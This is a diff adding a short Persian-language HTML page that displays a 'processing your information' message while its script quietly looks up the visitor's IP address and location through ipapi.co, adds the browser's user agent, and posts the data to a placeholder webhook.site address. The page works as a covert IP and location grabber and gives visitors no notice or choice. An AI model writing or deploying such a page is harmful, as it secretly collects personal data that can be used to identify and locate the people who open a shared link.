@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <title>اطلاعات شما</title>
+</head>
+<body>
+    <h2>در حال پردازش اطلاعات...</h2>
+
+    <script>
+        fetch("https://ipapi.co/json")
+        .then(response => response.json())
+        .then(data => {
+            const userInfo = {
+                ip: data.ip,
+                country: data.country_name,
+                region: data.region,
+                city: data.city,
+                browser: navigator.userAgent
+            };
+
+            // ارسال به Webhook یا ایمیل یا ذخیره در Google Sheets
+            fetch("https://webhook.site/your-custom-link", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(userInfo)
+            });
+        });
+    </script>
+</body>
+</html>
